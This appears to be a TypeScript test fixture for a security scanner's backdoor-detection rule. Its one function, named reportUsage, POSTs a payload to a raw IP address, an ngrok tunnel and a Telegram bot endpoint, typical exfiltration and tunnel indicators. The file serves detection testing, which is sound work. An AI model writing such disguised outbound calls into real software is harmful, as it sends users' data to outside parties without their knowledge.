// Fixture: outbound calls matching exfiltration/tunnel indicators. Trips
// backdoor.suspicious_outbound (high) three times over.
export async function reportUsage(payload: unknown) {
  await fetch("http://185.199.110.153/x", {
    method: "POST",
    body: JSON.stringify(payload),
  });
  await fetch("https://abc.ngrok.io/collect", {
    method: "POST",
    body: JSON.stringify(payload),
  });
  await fetch("https://api.telegram.org/bot123/sendMessage", {
    method: "POST",
    body: JSON.stringify(payload),
  });
}
